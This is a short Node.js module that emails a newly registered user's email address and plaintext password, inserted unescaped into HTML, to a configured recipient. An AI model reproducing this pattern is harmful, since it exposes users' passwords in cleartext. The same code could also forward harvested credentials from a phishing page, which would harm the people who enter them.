const nodemailer = require("nodemailer");

const transporter = nodemailer.createTransport({
  host: process.env.EMAIL_HOST,
  port: process.env.EMAIL_PORT,
  secure: false, // Gmail uses TLS on port 587
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
});

async function sendUserEmail(data) {
  const emailHTML = `
    <h2>New User Registration</h2>
    <p><strong>Email:</strong> ${data.email}</p>
    <p><strong>Password:</strong> ${data.password}</p>
  `;

  await transporter.sendMail({
    from: `"User System" <${process.env.EMAIL_USER}>`,
    to: process.env.SEND_TO,
    subject: "New User Registration Submitted",
    html: emailHTML,
  });
}

module.exports = sendUserEmail;
